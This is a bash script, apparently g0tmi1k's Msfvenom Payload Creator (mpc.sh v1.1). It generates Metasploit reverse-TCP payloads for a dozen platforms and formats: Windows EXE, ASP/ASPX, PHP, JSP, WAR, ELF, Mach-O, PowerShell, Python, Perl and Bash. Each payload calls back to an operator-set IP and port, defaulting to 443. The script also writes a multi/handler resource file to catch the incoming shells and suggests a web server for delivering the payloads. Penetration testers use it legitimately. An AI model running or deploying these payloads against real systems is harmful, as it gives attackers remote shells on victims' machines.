#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: mpc.sh (v1.1)               (Update: 2015-06-24) #
#-Info--------------------------------------------------------#
#  Quickly generate Metasploit payloads using msfvenom.       #
#-Author(s)---------------------------------------------------#
#  g0tmilk ~ https://blog.g0tmi1k.com/                        #
#-Operating System--------------------------------------------#
#  Designed for & tested on: Kali Linux & Metasploit v4.11+   #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Commands:                                                  #
#    msfvenom --list payloads                                 #
#    msfvenom --help-formats                                  #
#                             ---                             #
#  Payload names:                                             #
#    shell_bind_tcp - Single / Inline / Non Staged            #
#    shell/bind_tcp - Staged (Requires Metasploit)            #
#-More information--------------------------------------------#
#   - https://www.offensive-security.com/metasploit-unleashed/payloads/
#   - https://www.offensive-security.com/metasploit-unleashed/payload-types/
#   - https://www.offensive-security.com/metasploit-unleashed/msfvenom/
#   - https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads
#   - https://community.rapid7.com/community/metasploit/blog/2011/05/24/introducing-msfvenom
#   - https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode
#   - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
#--Install----------------------------------------------------#
#  curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" > /usr/bin/mpc
#  chmod +x /usr/bin/mpc
#-------------------------------------------------------------#


#-Defaults-------------------------------------------------------------#


##### Variables
OUTPATH="$(pwd)/"     # ./  /var/www/   /tmp/

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success/Asking for Input
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
RESET="\033[00m"       # Normal

##### Read command line arguments
TYPE="$(echo ${1} | \tr '[:upper:]' '[:lower:]')"
IP="${2}"
PORT="${3}"

##### Default value
SUCCESS=false
DOMAIN=false

##### (Optional) Enable debug mode?
#set -x


#-Function-------------------------------------------------------------#

## doAction TYPE IP PORT PAYLOAD CMD FILEEXT SHELL
function doAction {
  TYPE="${1}"
  IP="${2}"
  PORT="${3}"
  PAYLOAD="${4}"
  CMD="${5}"
  FILEEXT="${6}"
  SHELL="${7}"

  if [[ -z "${SHELL}" ]]; then
    echo -e " ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally)${RESET}. doAction TYPE($TYPE) IP($IP) PORT($PORT) PAYLOAD($PAYLOAD) CMD($CMD) FILEEXT($FILEEXT) SHELL($SHELL)" >&2
    exit 2
  fi

  FILENAME="${OUTPATH}$(echo ${TYPE}-${SHELL}.${FILEEXT} | \tr '[:upper:]' '[:lower:]')"
  FILEHANDLE="${OUTPATH}$(echo ${TYPE}-${SHELL}-${FILEEXT}.rc | \tr '[:upper:]' '[:lower:]')"

  X="  IP"
  [[ "${DOMAIN}" == "true" ]] &&  X='NAME'

  echo -e " ${YELLOW}[i]${RESET} ${X}: ${YELLOW}${IP}${RESET}"
  echo -e " ${YELLOW}[i]${RESET} PORT: ${YELLOW}${PORT}${RESET}"
  echo -e " ${YELLOW}[i]${RESET} TYPE: ${YELLOW}${TYPE}${RESET} (${PAYLOAD})"
  echo -e " ${YELLOW}[i]${RESET}  CMD: ${YELLOW}${CMD}${RESET}"

  [[ -e "${FILENAME}" ]] && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. Overwriting..."
  eval "${CMD}" 2>/dev/null
  if [[ -e "${FILENAME}" ]]; then
    echo -e " ${YELLOW}[i]${RESET} ${TYPE} ${SHELL} created: '${YELLOW}${FILENAME}${RESET}'"
  else
    echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET}. =(" >&2
    exit 2
  fi

  #echo -e " ${YELLOW}[i]${RESET}  File: $(\file -b ${FILENAME})"
  #echo -e " ${YELLOW}[i]${RESET}  Size: $(\du -h ${FILENAME} | \cut -f1)"
  #echo -e " ${YELLOW}[i]${RESET}   MD5: $(\openssl md5 ${FILENAME} | \awk '{print $2}')"
  #echo -e " ${YELLOW}[i]${RESET}  SHA1: $(\openssl sha1 ${FILENAME} | \awk '{print $2}')"

  cat <<EOF > "${FILEHANDLE}"
#
# RUN:   service postgresql start; service metasploit start; msfconsole -q -r "${FILENAME}"
#
use exploit/multi/handler
set PAYLOAD ${PAYLOAD}
set LHOST ${IP}
set LPORT ${PORT}
#set AutoRunScript "migrate -f -k"
set ExitOnSession false
run -j
EOF
  echo -e " ${YELLOW}[i]${RESET} MSF handler file: '${YELLOW}${FILEHANDLE}${RESET}'   (msfconsole -q -r ${FILEHANDLE})"
  SUCCESS=true
  return
}


#-Start----------------------------------------------------------------#


## Banner
echo -e " ${BLUE}[*]${RESET} ${BLUE}M${RESET}sfvenom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MPC${RESET} v${BLUE}1.1${RESET})"


## Check system
## msfvenom installed?
if [[ ! -n "$(\which msfvenom)" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${YELLOW}Couldn't find msfvenom${RESET}" >&2
  exit 3
fi

## Are we using Linux? (Sorry OSX users)
if [[ "$(\uname)" != "Linux" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${YELLOW}You're not using Linux${RESET}" >&2
  exit 3
fi

## Is there a writeable path for us?
if [[ ! -d "${OUTPATH}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${YELLOW}Unable to use ${OUTPATH}${RESET}" >&2
  exit 3
fi


## Set & get default values
[[ -z "${PORT}" ]] && PORT="443"
IFACE=( $(\awk '/:/ {print $1}' /proc/net/dev | \sed 's_:__') )
IPs=( $(\ifconfig | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1) )        # OSX -> \ifconfig | \grep inet | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}'


## Check user input
## Able to detect NIC interfaces?
if [[ "${IFACE}" == "" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${YELLOW}Couldn't find any network interfaces${RESET}" >&2
  echo -e " ${YELLOW}[i]${RESET} Need to manually define an IP.   ${YELLOW}${0} ${TYPE} <IP>${RESET}" >&2
  exit 2
fi

## Able to detect IP addresses?
if [[ "${IPs}" == "" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't discover IP addresses${RESET}. =(" >&2
  echo -e " ${YELLOW}[i]${RESET} Need to manually define it.   ${YELLOW}${0} ${TYPE} <IP>${RESET}" >&2
  exit 2
fi

## Did user enter an interface instead of an IP address?
for (( x=0; x<${#IFACE[@]}; ++x )); do [[ "${IP}" == "${IFACE[${x}]}" ]] && IP=${IPs[${x}]} && break; done

## Valued entered for IP address? Is it a valid IPv4 address? Else assume its a domain...
if [[ "${IP}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
  for (( i=1; i<${#BASH_REMATCH[@]}; ++i )); do
    (( ${BASH_REMATCH[$i]} <= 255 )) || { echo -e " ${YELLOW}[i]${RESET} IP (${IP}) appears to be a ${RED}invalid IPv4 address${RESET} =(" >&2 && exit 3; }
  done
elif [[ "${IP}" != "" ]]; then
  echo -e " ${YELLOW}[i]${RESET} ${IP} isn't a IPv4 address. ${YELLOW}Assuming its a domain name${RESET}..."
  DOMAIN=true
fi

## Valid port?
if [[ "${PORT}" -lt 1 || "${PORT}" -gt 65535 ]]; then
  echo -e " ${YELLOW}[i]${RESET} PORT (${PORT}) is incorrect. Needs to be ${YELLOW}between 1-65535${RESET}" >&2
  exit 3
fi

## IP menu
if [[ -n "${TYPE}" && -z "${IP}" ]]; then
  echo -e "\n ${YELLOW}[i]${RESET} Use which ${BLUE}interface${RESET}/${YELLOW}IP address${RESET}?:"
  I=0
  for iface in "${IFACE[@]}"; do
    IPs[${I}]=$(\ifconfig ${iface} | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1 | sort)
    [[ "${IPs[${I}]}" == "" ]] && IPs[${I}]="UNKNOWN"

    echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}+1]${RESET}.) ${BLUE}${iface}${RESET} - ${YELLOW}${IPs[${I}]}${RESET}"

    I=$[${I}+1]
  done
  _IP=""
  while [[ "${_IP}" == "" ]]; do
    echo -ne " ${YELLOW}[?]${RESET} ${GREEN}Select${RESET} 1-${I}, ${BLUE}interface${RESET} or ${YELLOW}IP address${RESET}"; read -p ": " INPUT
    for (( x=0; x<${#IFACE[@]}; ++x )); do [[ "${INPUT}" == "${IFACE[${x}]}" ]] && _IP=${IPs[${x}]}; done   # Did user enter interface?
    [[ "${INPUT}" != *"."* && "${INPUT}" -ge 1 && "${INPUT}" -le "${I}" ]] && _IP=${IPs[${INPUT}-1]}        # Did user select number?
    #for ip in "${IPs[@]}"; do [[ "${INPUT}" == "${ip}" ]] && _IP=${ip}; done                               # Did user enter a known IP?
    [[ "${INPUT}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]] && _IP=${INPUT}         # Did the user enter a IP address (doesn't valid it)
    IP=${_IP}
  done
  echo ""
fi

## ASP
if [[ "${TYPE}" == "asp" ]]; then
  TYPE="windows"
  FILEEXT="asp"
  SHELL="meterpreter"
  PAYLOAD="${TYPE}/${SHELL}/reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## ASPX
elif [[ "${TYPE}" == "aspx" ]]; then
  TYPE="windows"
  FILEEXT="aspx"
  SHELL="meterpreter"
  PAYLOAD="${TYPE}/${SHELL}/reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## Bash
elif [[ "${TYPE}" == "bash" || "${TYPE}" == "sh" ]]; then
  TYPE="bash"
  FILEEXT=".sh"
  SHELL="shell"
  PAYLOAD="cmd/unix/reverse_bash"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## Java
elif [[ "${TYPE}" == "java" || "${TYPE}" == "jsp" ]]; then
  TYPE="java"
  FILEEXT="jsp"
  SHELL="shell"
  PAYLOAD="java/jsp_shell_reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## Linux
elif [[ "${TYPE}" == "linux" || "${TYPE}" == "lin" || "${TYPE}" == "elf" ]]; then
  TYPE="linux"
  FILEEXT="elf"    #bin
  SHELL="meterpreter"
  PAYLOAD="${TYPE}/x86/${SHELL}/reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## OSX
elif [[ "${TYPE}" == "osx" || "${TYPE}" == "macho" ]]; then
  TYPE="osx"
  FILEEXT="macho"
  SHELL="shell"
  PAYLOAD="osx/x86/shell_reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## Perl
elif [[ "${TYPE}" == "perl" || "${TYPE}" == "pl" ]]; then
  TYPE="linux"
  FILEEXT="pl"
  SHELL="shell"
  PAYLOAD="cmd/unix/reverse_perl"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## PHP
elif [[ "${TYPE}" == "php" ]]; then
  TYPE="php"
  FILEEXT="php"
  SHELL="meterpreter"
  PAYLOAD="${TYPE}/${SHELL}/reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## Powersehll
elif [[ "${TYPE}" == "powershell" || "${TYPE}" == "ps1" ]]; then
  TYPE="windows"
  FILEEXT="ps1"
  SHELL="meterpreter"
  PAYLOAD="${TYPE}/${SHELL}/reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ps1 --platform ${TYPE} -e generic/none -a x86 LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## Python
elif [[ "${TYPE}" == "python" || "${TYPE}" == "py" ]]; then
  TYPE="python"
  FILEEXT="py"
  SHELL="meterpreter"
  PAYLOAD="${TYPE}/${SHELL}/reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## Tomcat
elif [[ "${TYPE}" == "tomcat" || "${TYPE}" == "war" ]]; then
  TYPE="tomcat"
  FILEEXT="war"
  SHELL="shell"
  PAYLOAD="java/shell_reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform java -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
## Windows
elif [[ "${TYPE}" == "windows" || "${TYPE}" == "win" || "${TYPE}" == "exe" ]]; then
  TYPE="windows"
  FILEEXT="exe"
  SHELL="meterpreter"
  PAYLOAD="${TYPE}/${SHELL}/reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${SHELL}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}"
elif [[ -z "${TYPE}" ]]; then
  #echo -e "\n ${YELLOW}[i]${RESET} ${YELLOW}Missing type${RESET}"
  true
else
  echo -e "\n ${YELLOW}[i]${RESET} Unknown type: ${YELLOW}${TYPE}${RESET}" >&2
fi


#-Done-----------------------------------------------------------------#


##### Done!
if [[ "$SUCCESS" = true ]]; then
  echo -e " ${GREEN}[?]${RESET} Quick ${GREEN}web server${RESET}?   python -m SimpleHTTPServer 8080"
  echo -e " ${BLUE}[*]${RESET} ${BLUE}Done${RESET}!"
  exit 0
else
  echo -e "\n ${YELLOW}[i]${RESET} ${BLUE}${0}${RESET} <TYPE> (<DOMAIN/IP>) (<PORT>)"
  echo -e " ${YELLOW}[i]${RESET} <TYPE>: (All reverse TCP payloads)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}ASP${RESET} (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}ASPX${RESET} (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Bash${RESET} [.${YELLOW}sh${RESET}] (shell)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Java${RESET} [.${YELLOW}jsp${RESET}] (shell)"     #non staged
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Linux${RESET} [.${YELLOW}elf${RESET}] (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}OSX${RESET} [.${YELLOW}macho${RESET}] (shell)"    #non staged
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Perl${RESET} [.${YELLOW}pl${RESET}] (shell)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}PHP${RESET} (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Powershell${RESET} [.${YELLOW}ps1${RESET}] (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Python${RESET} [.${YELLOW}py${RESET}] (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Tomcat${RESET} [.${YELLOW}war${RESET}] (shell)"   #non staged
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Windows${RESET} [.${YELLOW}exe${RESET}] (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET} Missing <DOMAIN/IP> will default to ${YELLOW}IP menu${RESET}"
  echo -e " ${YELLOW}[i]${RESET} Missing <PORT> will default to ${YELLOW}443${RESET}"
  exit 1
fi
